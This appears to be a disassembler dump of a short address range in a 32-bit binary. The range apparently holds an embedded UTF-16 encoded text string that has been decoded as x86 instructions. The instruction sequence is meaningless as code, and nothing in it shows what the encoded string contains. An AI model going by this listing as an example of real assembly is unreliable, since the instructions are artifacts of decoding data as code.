  40a4ed:	00 77 00             	add    %dh,0x0(%edi)
  40a4f0:	77 00                	ja     0x40a4f2
  40a4f2:	73 00                	jae    0x40a4f4
  40a4f4:	35 00 36 00 55       	xor    $0x55003600,%eax
  40a4f9:	00 4a 00             	add    %cl,0x0(%edx)
  40a4fc:	78 00                	js     0x40a4fe
  40a4fe:	69 00 2b 00 44 00    	imul   $0x44002b,(%eax),%eax
  40a504:	6f                   	outsl  %ds:(%esi),(%dx)
  40a505:	00 66 00             	add    %ah,0x0(%esi)
  40a508:	56                   	push   %esi
  40a509:	00 32                	add    %dh,(%edx)
  40a50b:	00 32                	add    %dh,(%edx)
  40a50d:	00 67 00             	add    %ah,0x0(%edi)
  40a510:	2b 00                	sub    (%eax),%eax
  40a512:	55                   	push   %ebp
  40a513:	00 6a 00             	add    %ch,0x0(%edx)
  40a516:	68 00 32 00 66       	push   $0x66003200
  40a51b:	00 72 00             	add    %dh,0x0(%edx)
  40a51e:	43                   	inc    %ebx
  40a51f:	00 6a 00             	add    %ch,0x0(%edx)
  40a522:	68 00 4d 00 36       	push   $0x36004d00
  40a527:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a52b:	00 7a 00             	add    %bh,0x0(%edx)
  40a52e:	39 00                	cmp    %eax,(%eax)
  40a530:	76 00                	jbe    0x40a532
  40a532:	46                   	inc    %esi
  40a533:	00 32                	add    %dh,(%edx)
  40a535:	00 55 00             	add    %dl,0x0(%ebp)
  40a538:	44                   	inc    %esp
  40a539:	00 43 00             	add    %al,0x0(%ebx)
  40a53c:	5a                   	pop    %edx
  40a53d:	00 59 00             	add    %bl,0x0(%ecx)
  40a540:	51                   	push   %ecx
  40a541:	00 53 00             	add    %dl,0x0(%ebx)
  40a544:	74 00                	je     0x40a546
  40a546:	47                   	inc    %edi
  40a547:	00 63 00             	add    %ah,0x0(%ebx)
  40a54a:	44                   	inc    %esp
  40a54b:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40a54f:	00 56 00             	add    %dl,0x0(%esi)
  40a552:	37                   	aaa
  40a553:	00 67 00             	add    %ah,0x0(%edi)
  40a556:	6e                   	outsb  %ds:(%esi),(%dx)
  40a557:	00 4a 00             	add    %cl,0x0(%edx)
  40a55a:	2f                   	das
  40a55b:	00 4f 00             	add    %cl,0x0(%edi)
  40a55e:	6c                   	insb   (%dx),%es:(%edi)
  40a55f:	00 5a 00             	add    %bl,0x0(%edx)
  40a562:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40a566:	2f                   	das
  40a567:	00 4d 00             	add    %cl,0x0(%ebp)
  40a56a:	2f                   	das
  40a56b:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
  40a56f:	00 70 00             	add    %dh,0x0(%eax)
  40a572:	6e                   	outsb  %ds:(%esi),(%dx)
  40a573:	00 63 00             	add    %ah,0x0(%ebx)
  40a576:	51                   	push   %ecx
  40a577:	00 69 00             	add    %ch,0x0(%ecx)
  40a57a:	61                   	popa
  40a57b:	00 5a 00             	add    %bl,0x0(%edx)
  40a57e:	2b 00                	sub    (%eax),%eax
  40a580:	4b                   	dec    %ebx
  40a581:	00 72 00             	add    %dh,0x0(%edx)
  40a584:	70 00                	jo     0x40a586
  40a586:	7a 00                	jp     0x40a588
  40a588:	48                   	dec    %eax
  40a589:	00 57 00             	add    %dl,0x0(%edi)
  40a58c:	65 00 6b 00          	add    %ch,%gs:0x0(%ebx)
  40a590:	68 00 34 00 2b       	push   $0x2b003400
  40a595:	00 2b                	add    %ch,(%ebx)
  40a597:	00 53 00             	add    %dl,0x0(%ebx)
  40a59a:	50                   	push   %eax
  40a59b:	00 48 00             	add    %cl,0x0(%eax)
  40a59e:	72 00                	jb     0x40a5a0
  40a5a0:	61                   	popa
  40a5a1:	00 37                	add    %dh,(%edi)
  40a5a3:	00 6f 00             	add    %ch,0x0(%edi)
  40a5a6:	61                   	popa
  40a5a7:	00 30                	add    %dh,(%eax)
  40a5a9:	00 39                	add    %bh,(%ecx)
  40a5ab:	00 2f                	add    %ch,(%edi)
  40a5ad:	00 78 00             	add    %bh,0x0(%eax)
  40a5b0:	35 00 61 00 5a       	xor    $0x5a006100,%eax
  40a5b5:	00 52 00             	add    %dl,0x0(%edx)
  40a5b8:	75 00                	jne    0x40a5ba
  40a5ba:	58                   	pop    %eax
  40a5bb:	00 53 00             	add    %dl,0x0(%ebx)
  40a5be:	31 00                	xor    %eax,(%eax)
  40a5c0:	4c                   	dec    %esp
  40a5c1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5c4:	74 00                	je     0x40a5c6
  40a5c6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5c7:	00 47 00             	add    %al,0x0(%edi)
  40a5ca:	67 00 6c 00          	add    %ch,0x0(%si)
  40a5ce:	35 00 75 00 6f       	xor    $0x6f007500,%eax
  40a5d3:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40a5d7:	00 61 00             	add    %ah,0x0(%ecx)
  40a5da:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40a5de:	51                   	push   %ecx
  40a5df:	00 53 00             	add    %dl,0x0(%ebx)
  40a5e2:	61                   	popa
  40a5e3:	00 49 00             	add    %cl,0x0(%ecx)
  40a5e6:	76 00                	jbe    0x40a5e8
  40a5e8:	4b                   	dec    %ebx
  40a5e9:	00 63 00             	add    %ah,0x0(%ebx)
  40a5ec:	77 00                	ja     0x40a5ee
  40a5ee:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  40a5f1:	00 66 00             	add    %ah,0x0(%esi)
  40a5f4:	49                   	dec    %ecx
  40a5f5:	00 6e 00             	add    %ch,0x0(%esi)
  40a5f8:	31 00                	xor    %eax,(%eax)
  40a5fa:	79 00                	jns    0x40a5fc
  40a5fc:	39 00                	cmp    %eax,(%eax)
  40a5fe:	62 00                	bound  %eax,(%eax)
  40a600:	30 00                	xor    %al,(%eax)
  40a602:	4c                   	dec    %esp
  40a603:	00 42 00             	add    %al,0x0(%edx)
  40a606:	6d                   	insl   (%dx),%es:(%edi)
  40a607:	00 46 00             	add    %al,0x0(%esi)
  40a60a:	6b 00 37             	imul   $0x37,(%eax),%eax
  40a60d:	00 32                	add    %dh,(%edx)
  40a60f:	00 30                	add    %dh,(%eax)
  40a611:	00 77 00             	add    %dh,0x0(%edi)
  40a614:	43                   	inc    %ebx
  40a615:	00 4f 00             	add    %cl,0x0(%edi)
  40a618:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40a61c:	50                   	push   %eax
  40a61d:	00 47 00             	add    %al,0x0(%edi)
  40a620:	65 00 52 00          	add    %dl,%gs:0x0(%edx)
  40a624:	2f                   	das
  40a625:	00 70 00             	add    %dh,0x0(%eax)
  40a628:	78 00                	js     0x40a62a
  40a62a:	69 00 61 00 41 00    	imul   $0x410061,(%eax),%eax
  40a630:	32 00                	xor    (%eax),%al
  40a632:	35 00 4a 00 65       	xor    $0x65004a00,%eax
  40a637:	00 68 00             	add    %ch,0x0(%eax)
  40a63a:	62 00                	bound  %eax,(%eax)
  40a63c:	4b                   	dec    %ebx
  40a63d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a640:	36 00 4b 00          	add    %cl,%ss:0x0(%ebx)
  40a644:	62 00                	bound  %eax,(%eax)
  40a646:	35 00 5a 00 4f       	xor    $0x4f005a00,%eax
  40a64b:	00 58 00             	add    %bl,0x0(%eax)
  40a64e:	76 00                	jbe    0x40a650
  40a650:	33 00                	xor    (%eax),%eax
  40a652:	38 00                	cmp    %al,(%eax)
  40a654:	77 00                	ja     0x40a656
  40a656:	71 00                	jno    0x40a658
  40a658:	2f                   	das
  40a659:	00 73 00             	add    %dh,0x0(%ebx)
  40a65c:	78 00                	js     0x40a65e
  40a65e:	33 00                	xor    (%eax),%eax
  40a660:	70 00                	jo     0x40a662
  40a662:	4c                   	dec    %esp
  40a663:	00 66 00             	add    %ah,0x0(%esi)
  40a666:	37                   	aaa
  40a667:	00 39                	add    %bh,(%ecx)
  40a669:	00 32                	add    %dh,(%edx)
  40a66b:	00 66 00             	add    %ah,0x0(%esi)
  40a66e:	6c                   	insb   (%dx),%es:(%edi)
  40a66f:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40a673:	00 5a 00             	add    %bl,0x0(%edx)
  40a676:	50                   	push   %eax
  40a677:	00 48 00             	add    %cl,0x0(%eax)
  40a67a:	77 00                	ja     0x40a67c
  40a67c:	4a                   	dec    %edx
  40a67d:	00 50 00             	add    %dl,0x0(%eax)
  40a680:	72 00                	jb     0x40a682
  40a682:	43                   	inc    %ebx
  40a683:	00 49 00             	add    %cl,0x0(%ecx)
  40a686:	4b                   	dec    %ebx
  40a687:	00 70 00             	add    %dh,0x0(%eax)
  40a68a:	41                   	inc    %ecx
  40a68b:	00 66 00             	add    %ah,0x0(%esi)
  40a68e:	71 00                	jno    0x40a690
  40a690:	51                   	push   %ecx
  40a691:	00 58 00             	add    %bl,0x0(%eax)
  40a694:	4e                   	dec    %esi
  40a695:	00 79 00             	add    %bh,0x0(%ecx)
  40a698:	72 00                	jb     0x40a69a
  40a69a:	7a 00                	jp     0x40a69c
  40a69c:	4c                   	dec    %esp
  40a69d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a6a0:	67 00 57 00          	add    %dl,0x0(%bx)
  40a6a4:	5a                   	pop    %edx
  40a6a5:	00 70 00             	add    %dh,0x0(%eax)
  40a6a8:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a6ac:	75 00                	jne    0x40a6ae
  40a6ae:	58                   	pop    %eax
  40a6af:	00 6a 00             	add    %ch,0x0(%edx)
  40a6b2:	6a 00                	push   $0x0
  40a6b4:	46                   	inc    %esi
  40a6b5:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
  40a6b9:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a6bd:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40a6c1:	00 53 00             	add    %dl,0x0(%ebx)
  40a6c4:	56                   	push   %esi
  40a6c5:	00 50 00             	add    %dl,0x0(%eax)
  40a6c8:	78 00                	js     0x40a6ca
  40a6ca:	43                   	inc    %ebx
  40a6cb:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a6cf:	00 6b 00             	add    %ch,0x0(%ebx)
  40a6d2:	72 00                	jb     0x40a6d4
  40a6d4:	67 00 67 00          	add    %ah,0x0(%bx)
  40a6d8:	57                   	push   %edi
  40a6d9:	00 49 00             	add    %cl,0x0(%ecx)
  40a6dc:	69 00 32 00 4c 00    	imul   $0x4c0032,(%eax),%eax
  40a6e2:	4a                   	dec    %edx
  40a6e3:	00 52 00             	add    %dl,0x0(%edx)
  40a6e6:	4e                   	dec    %esi
  40a6e7:	00 71 00             	add    %dh,0x0(%ecx)
  40a6ea:	4f                   	dec    %edi
  40a6eb:	00 69 00             	add    %ch,0x0(%ecx)
  40a6ee:	49                   	dec    %ecx
  40a6ef:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40a6f3:	00 43 00             	add    %al,0x0(%ebx)
  40a6f6:	50                   	push   %eax
  40a6f7:	00 30                	add    %dh,(%eax)
  40a6f9:	00 56 00             	add    %dl,0x0(%esi)
  40a6fc:	78 00                	js     0x40a6fe
  40a6fe:	72 00                	jb     0x40a700
  40a700:	42                   	inc    %edx
  40a701:	00 35 00 53 00 4b    	add    %dh,0x4b005300
  40a707:	00 51 00             	add    %dl,0x0(%ecx)
  40a70a:	73 00                	jae    0x40a70c
  40a70c:	77 00                	ja     0x40a70e
  40a70e:	42                   	inc    %edx
  40a70f:	00 77 00             	add    %dh,0x0(%edi)
  40a712:	4f                   	dec    %edi
  40a713:	00 4a 00             	add    %cl,0x0(%edx)
  40a716:	4b                   	dec    %ebx
  40a717:	00 52 00             	add    %dl,0x0(%edx)
  40a71a:	79 00                	jns    0x40a71c
  40a71c:	69 00 37 00 75 00    	imul   $0x750037,(%eax),%eax
  40a722:	47                   	inc    %edi
  40a723:	00 61 00             	add    %ah,0x0(%ecx)
  40a726:	36 00 46 00          	add    %al,%ss:0x0(%esi)
  40a72a:	4d                   	dec    %ebp
  40a72b:	00 73 00             	add    %dh,0x0(%ebx)
  40a72e:	59                   	pop    %ecx
  40a72f:	00 68 00             	add    %ch,0x0(%eax)
  40a732:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40a736:	78 00                	js     0x40a738
  40a738:	51                   	push   %ecx
  40a739:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a73d:	00 43 00             	add    %al,0x0(%ebx)
  40a740:	54                   	push   %esp
  40a741:	00 66 00             	add    %ah,0x0(%esi)
  40a744:	33 00                	xor    (%eax),%eax
  40a746:	67 00 75 00          	add    %dh,0x0(%di)
  40a74a:	47                   	inc    %edi
  40a74b:	00 4f 00             	add    %cl,0x0(%edi)
  40a74e:	54                   	push   %esp
  40a74f:	00 57 00             	add    %dl,0x0(%edi)
  40a752:	69 00 31 00 74 00    	imul   $0x740031,(%eax),%eax
  40a758:	51                   	push   %ecx
  40a759:	00 51 00             	add    %dl,0x0(%ecx)
  40a75c:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40a760:	52                   	push   %edx
  40a761:	00 30                	add    %dh,(%eax)
  40a763:	00 2b                	add    %ch,(%ebx)
  40a765:	00 43 00             	add    %al,0x0(%ebx)
  40a768:	72 00                	jb     0x40a76a
  40a76a:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40a76e:	53                   	push   %ebx
  40a76f:	00 71 00             	add    %dh,0x0(%ecx)
  40a772:	35 00 62 00 46       	xor    $0x46006200,%eax
  40a777:	00 4d 00             	add    %cl,0x0(%ebp)
  40a77a:	35 00 55 00 57       	xor    $0x57005500,%eax
  40a77f:	00 56 00             	add    %dl,0x0(%esi)
  40a782:	49                   	dec    %ecx
  40a783:	00 39                	add    %bh,(%ecx)
  40a785:	00 48 00             	add    %cl,0x0(%eax)
  40a788:	45                   	inc    %ebp
  40a789:	00 33                	add    %dh,(%ebx)
  40a78b:	00 55 00             	add    %dl,0x0(%ebp)
  40a78e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a78f:	00 59 00             	add    %bl,0x0(%ecx)
  40a792:	53                   	push   %ebx
  40a793:	00 56 00             	add    %dl,0x0(%esi)
  40a796:	74 00                	je     0x40a798
  40a798:	47                   	inc    %edi
  40a799:	00 76 00             	add    %dh,0x0(%esi)
  40a79c:	54                   	push   %esp
  40a79d:	00 71 00             	add    %dh,0x0(%ecx)
  40a7a0:	52                   	push   %edx
  40a7a1:	00 70 00             	add    %dh,0x0(%eax)
  40a7a4:	74 00                	je     0x40a7a6
  40a7a6:	48                   	dec    %eax
  40a7a7:	00 77 00             	add    %dh,0x0(%edi)
  40a7aa:	68 00 59 00 6e       	push   $0x6e005900
  40a7af:	00 51 00             	add    %dl,0x0(%ecx)
  40a7b2:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40a7b6:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  40a7ba:	70 00                	jo     0x40a7bc
  40a7bc:	2b 00                	sub    (%eax),%eax
  40a7be:	45                   	inc    %ebp
  40a7bf:	00 46 00             	add    %al,0x0(%esi)
  40a7c2:	79 00                	jns    0x40a7c4
  40a7c4:	6b 00 33             	imul   $0x33,(%eax),%eax
  40a7c7:	00 67 00             	add    %ah,0x0(%edi)
  40a7ca:	72 00                	jb     0x40a7cc
  40a7cc:	65 00 2f             	add    %ch,%gs:(%edi)
  40a7cf:	00 4b 00             	add    %cl,0x0(%ebx)
  40a7d2:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40a7d6:	58                   	pop    %eax
  40a7d7:	00 48 00             	add    %cl,0x0(%eax)
  40a7da:	49                   	dec    %ecx
  40a7db:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40a7df:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
  40a7e3:	00 65 00             	add    %ah,0x0(%ebp)
  40a7e6:	2f                   	das
  40a7e7:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a7eb:	00 56 00             	add    %dl,0x0(%esi)
  40a7ee:	71 00                	jno    0x40a7f0
  40a7f0:	63 00                	arpl   %eax,(%eax)
  40a7f2:	39 00                	cmp    %eax,(%eax)
  40a7f4:	70 00                	jo     0x40a7f6
  40a7f6:	6a 00                	push   $0x0
  40a7f8:	55                   	push   %ebp
  40a7f9:	00 63 00             	add    %ah,0x0(%ebx)
  40a7fc:	50                   	push   %eax
  40a7fd:	00 44 00 62          	add    %al,0x62(%eax,%eax,1)
  40a801:	00 50 00             	add    %dl,0x0(%eax)
  40a804:	69 00 45 00 33 00    	imul   $0x330045,(%eax),%eax
  40a80a:	30 00                	xor    %al,(%eax)
  40a80c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a80d:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40a811:	00 4b 00             	add    %cl,0x0(%ebx)
  40a814:	62 00                	bound  %eax,(%eax)
  40a816:	48                   	dec    %eax
  40a817:	00 59 00             	add    %bl,0x0(%ecx)
  40a81a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a81b:	00 45 00             	add    %al,0x0(%ebp)
  40a81e:	5a                   	pop    %edx
  40a81f:	00 32                	add    %dh,(%edx)
  40a821:	00 37                	add    %dh,(%edi)
  40a823:	00 43 00             	add    %al,0x0(%ebx)
  40a826:	4f                   	dec    %edi
  40a827:	00 4a 00             	add    %cl,0x0(%edx)
  40a82a:	38 00                	cmp    %al,(%eax)
  40a82c:	41                   	inc    %ecx
  40a82d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a830:	61                   	popa
  40a831:	00 4a 00             	add    %cl,0x0(%edx)
  40a834:	2b 00                	sub    (%eax),%eax
  40a836:	50                   	push   %eax
  40a837:	00 31                	add    %dh,(%ecx)
  40a839:	00 71 00             	add    %dh,0x0(%ecx)
  40a83c:	45                   	inc    %ebp
  40a83d:	00 30                	add    %dh,(%eax)
  40a83f:	00 63 00             	add    %ah,0x0(%ebx)
  40a842:	6b 00 79             	imul   $0x79,(%eax),%eax
  40a845:	00 59 00             	add    %bl,0x0(%ecx)
  40a848:	58                   	pop    %eax
  40a849:	00 57 00             	add    %dl,0x0(%edi)
  40a84c:	47                   	inc    %edi
  40a84d:	00 41 00             	add    %al,0x0(%ecx)
  40a850:	6d                   	insl   (%dx),%es:(%edi)
  40a851:	00 76 00             	add    %dh,0x0(%esi)
  40a854:	6d                   	insl   (%dx),%es:(%edi)
  40a855:	00 2b                	add    %ch,(%ebx)
  40a857:	00 73 00             	add    %dh,0x0(%ebx)
  40a85a:	58                   	pop    %eax
  40a85b:	00 68 00             	add    %ch,0x0(%eax)
  40a85e:	64 00 78 00          	add    %bh,%fs:0x0(%eax)
  40a862:	74 00                	je     0x40a864
  40a864:	71 00                	jno    0x40a866
  40a866:	35 00 72 00 36       	xor    $0x36007200,%eax
  40a86b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a86e:	4f                   	dec    %edi
  40a86f:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40a873:	00 6a 00             	add    %ch,0x0(%edx)
  40a876:	63 00                	arpl   %eax,(%eax)
  40a878:	42                   	inc    %edx
  40a879:	00 2f                	add    %ch,(%edi)
  40a87b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a87e:	48                   	dec    %eax
  40a87f:	00 4f 00             	add    %cl,0x0(%edi)
  40a882:	42                   	inc    %edx
  40a883:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a886:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40a88a:	35 00 78 00 44       	xor    $0x44007800,%eax
  40a88f:	00 4a 00             	add    %cl,0x0(%edx)
  40a892:	42                   	inc    %edx
  40a893:	00 59 00             	add    %bl,0x0(%ecx)
  40a896:	4a                   	dec    %edx
  40a897:	00 64 00 59          	add    %ah,0x59(%eax,%eax,1)
  40a89b:	00 5a 00             	add    %bl,0x0(%edx)
  40a89e:	4d                   	dec    %ebp
  40a89f:	00 53 00             	add    %dl,0x0(%ebx)
  40a8a2:	72 00                	jb     0x40a8a4
  40a8a4:	51                   	push   %ecx
  40a8a5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8a8:	76 00                	jbe    0x40a8aa
  40a8aa:	37                   	aaa
  40a8ab:	00 36                	add    %dh,(%esi)
  40a8ad:	00 71 00             	add    %dh,0x0(%ecx)
  40a8b0:	6d                   	insl   (%dx),%es:(%edi)
  40a8b1:	00 53 00             	add    %dl,0x0(%ebx)
  40a8b4:	4d                   	dec    %ebp
  40a8b5:	00 41 00             	add    %al,0x0(%ecx)
  40a8b8:	45                   	inc    %ebp
  40a8b9:	00 31                	add    %dh,(%ecx)
  40a8bb:	00 36                	add    %dh,(%esi)
  40a8bd:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8c0:	55                   	push   %ebp
  40a8c1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a8c4:	62 00                	bound  %eax,(%eax)
  40a8c6:	4c                   	dec    %esp
  40a8c7:	00 39                	add    %bh,(%ecx)
  40a8c9:	00 30                	add    %dh,(%eax)
  40a8cb:	00 68 00             	add    %ch,0x0(%eax)
  40a8ce:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8cf:	00 38                	add    %bh,(%eax)
  40a8d1:	00 72 00             	add    %dh,0x0(%edx)
  40a8d4:	71 00                	jno    0x40a8d6
  40a8d6:	4f                   	dec    %edi
  40a8d7:	00 59 00             	add    %bl,0x0(%ecx)
  40a8da:	46                   	inc    %esi
  40a8db:	00 78 00             	add    %bh,0x0(%eax)
  40a8de:	37                   	aaa
  40a8df:	00 46 00             	add    %al,0x0(%esi)
  40a8e2:	61                   	popa
  40a8e3:	00 4f 00             	add    %cl,0x0(%edi)
  40a8e6:	44                   	inc    %esp
  40a8e7:	00 42 00             	add    %al,0x0(%edx)
  40a8ea:	4f                   	dec    %edi
  40a8eb:	00 75 00             	add    %dh,0x0(%ebp)
  40a8ee:	30 00                	xor    %al,(%eax)
  40a8f0:	59                   	pop    %ecx
  40a8f1:	00 71 00             	add    %dh,0x0(%ecx)
  40a8f4:	79 00                	jns    0x40a8f6
  40a8f6:	73 00                	jae    0x40a8f8
  40a8f8:	51                   	push   %ecx
  40a8f9:	00 55 00             	add    %dl,0x0(%ebp)
  40a8fc:	72 00                	jb     0x40a8fe
  40a8fe:	33 00                	xor    (%eax),%eax
  40a900:	62 00                	bound  %eax,(%eax)
  40a902:	4c                   	dec    %esp
  40a903:	00 77 00             	add    %dh,0x0(%edi)
  40a906:	39 00                	cmp    %eax,(%eax)
  40a908:	78 00                	js     0x40a90a
  40a90a:	30 00                	xor    %al,(%eax)
  40a90c:	6b 00 41             	imul   $0x41,(%eax),%eax
  40a90f:	00 38                	add    %bh,(%eax)
  40a911:	00 79 00             	add    %bh,0x0(%ecx)
  40a914:	59                   	pop    %ecx
  40a915:	00 74 00 4c          	add    %dh,0x4c(%eax,%eax,1)
  40a919:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  40a91d:	00 46 00             	add    %al,0x0(%esi)
  40a920:	35 00 4b 00 38       	xor    $0x38004b00,%eax
  40a925:	00 6e 00             	add    %ch,0x0(%esi)
  40a928:	50                   	push   %eax
  40a929:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  40a92d:	00 62 00             	add    %ah,0x0(%edx)
  40a930:	48                   	dec    %eax
  40a931:	00 37                	add    %dh,(%edi)
  40a933:	00 6f 00             	add    %ch,0x0(%edi)
  40a936:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  40a93a:	58                   	pop    %eax
  40a93b:	00 42 00             	add    %al,0x0(%edx)
  40a93e:	69 00 58 00 65 00    	imul   $0x650058,(%eax),%eax
  40a944:	32 00                	xor    (%eax),%al
  40a946:	4c                   	dec    %esp
  40a947:	00 59 00             	add    %bl,0x0(%ecx)
  40a94a:	6c                   	insb   (%dx),%es:(%edi)
  40a94b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a94e:	68 00 31 00 5a       	push   $0x5a003100
  40a953:	00 4a 00             	add    %cl,0x0(%edx)
  40a956:	53                   	push   %ebx
  40a957:	00 6d 00             	add    %ch,0x0(%ebp)
  40a95a:	45                   	inc    %ebp
  40a95b:	00 76 00             	add    %dh,0x0(%esi)
  40a95e:	59                   	pop    %ecx
  40a95f:	00 33                	add    %dh,(%ebx)
  40a961:	00 37                	add    %dh,(%edi)
  40a963:	00 67 00             	add    %ah,0x0(%edi)
  40a966:	6f                   	outsl  %ds:(%esi),(%dx)
  40a967:	00 46 00             	add    %al,0x0(%esi)
  40a96a:	30 00                	xor    %al,(%eax)
  40a96c:	30 00                	xor    %al,(%eax)
  40a96e:	67 00 71 00          	add    %dh,0x0(%bx,%di)
  40a972:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a976:	6d                   	insl   (%dx),%es:(%edi)
  40a977:	00 6d 00             	add    %ch,0x0(%ebp)
  40a97a:	2f                   	das
  40a97b:	00 32                	add    %dh,(%edx)
  40a97d:	00 46 00             	add    %al,0x0(%esi)
  40a980:	6d                   	insl   (%dx),%es:(%edi)
  40a981:	00 58 00             	add    %bl,0x0(%eax)
  40a984:	4c                   	dec    %esp
  40a985:	00 62 00             	add    %ah,0x0(%edx)
  40a988:	41                   	inc    %ecx
  40a989:	00 66 00             	add    %ah,0x0(%esi)
  40a98c:	78 00                	js     0x40a98e
  40a98e:	41                   	inc    %ecx
  40a98f:	00 36                	add    %dh,(%esi)
  40a991:	00 62 00             	add    %ah,0x0(%edx)
  40a994:	45                   	inc    %ebp
  40a995:	00 4b 00             	add    %cl,0x0(%ebx)
  40a998:	62 00                	bound  %eax,(%eax)
  40a99a:	79 00                	jns    0x40a99c
  40a99c:	52                   	push   %edx
  40a99d:	00 56 00             	add    %dl,0x0(%esi)
  40a9a0:	57                   	push   %edi
  40a9a1:	00 31                	add    %dh,(%ecx)
  40a9a3:	00 51 00             	add    %dl,0x0(%ecx)
  40a9a6:	54                   	push   %esp
  40a9a7:	00 4a 00             	add    %cl,0x0(%edx)
  40a9aa:	34 00                	xor    $0x0,%al
  40a9ac:	52                   	push   %edx
  40a9ad:	00 68 00             	add    %ch,0x0(%eax)
  40a9b0:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a9b4:	33 00                	xor    (%eax),%eax
  40a9b6:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a9ba:	62 00                	bound  %eax,(%eax)
  40a9bc:	65 00 54 00 78       	add    %dl,%gs:0x78(%eax,%eax,1)
  40a9c1:	00 4c 00 77          	add    %cl,0x77(%eax,%eax,1)
  40a9c5:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9c8:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40a9cc:	76 00                	jbe    0x40a9ce
  40a9ce:	72 00                	jb     0x40a9d0
  40a9d0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9d1:	00 75 00             	add    %dh,0x0(%ebp)
  40a9d4:	45                   	inc    %ebp
  40a9d5:	00 39                	add    %bh,(%ecx)
  40a9d7:	00 55 00             	add    %dl,0x0(%ebp)
  40a9da:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a9de:	67 00 44 00          	add    %al,0x0(%si)
  40a9e2:	56                   	push   %esi
  40a9e3:	00 75 00             	add    %dh,0x0(%ebp)
  40a9e6:	72 00                	jb     0x40a9e8
  40a9e8:	34 00                	xor    $0x0,%al
  40a9ea:	50                   	push   %eax
  40a9eb:	00 41 00             	add    %al,0x0(%ecx)
  40a9ee:	4b                   	dec    %ebx
  40a9ef:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a9f2:	6c                   	insb   (%dx),%es:(%edi)
  40a9f3:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40a9f7:	00 5a 00             	add    %bl,0x0(%edx)
  40a9fa:	70 00                	jo     0x40a9fc
  40a9fc:	36 00 4c 00 33       	add    %cl,%ss:0x33(%eax,%eax,1)
  40aa01:	00 39                	add    %bh,(%ecx)
  40aa03:	00 4b 00             	add    %cl,0x0(%ebx)
  40aa06:	48                   	dec    %eax
  40aa07:	00 58 00             	add    %bl,0x0(%eax)
  40aa0a:	51                   	push   %ecx
  40aa0b:	00 31                	add    %dh,(%ecx)
  40aa0d:	00 50 00             	add    %dl,0x0(%eax)
  40aa10:	43                   	inc    %ebx
  40aa11:	00 45 00             	add    %al,0x0(%ebp)
  40aa14:	43                   	inc    %ebx
  40aa15:	00 73 00             	add    %dh,0x0(%ebx)
  40aa18:	30 00                	xor    %al,(%eax)
  40aa1a:	73 00                	jae    0x40aa1c
  40aa1c:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa1d:	00 48 00             	add    %cl,0x0(%eax)
  40aa20:	6b 00 73             	imul   $0x73,(%eax),%eax
  40aa23:	00 48 00             	add    %cl,0x0(%eax)
  40aa26:	4e                   	dec    %esi
  40aa27:	00 5a 00             	add    %bl,0x0(%edx)
  40aa2a:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40aa2d:	00 77 00             	add    %dh,0x0(%edi)
  40aa30:	2b 00                	sub    (%eax),%eax
  40aa32:	33 00                	xor    (%eax),%eax
  40aa34:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40aa38:	47                   	inc    %edi
  40aa39:	00 48 00             	add    %cl,0x0(%eax)
  40aa3c:	63 00                	arpl   %eax,(%eax)
  40aa3e:	47                   	inc    %edi
  40aa3f:	00 45 00             	add    %al,0x0(%ebp)
  40aa42:	67 00 36 00 69       	add    %dh,0x6900
  40aa47:	00 48 00             	add    %cl,0x0(%eax)
  40aa4a:	50                   	push   %eax
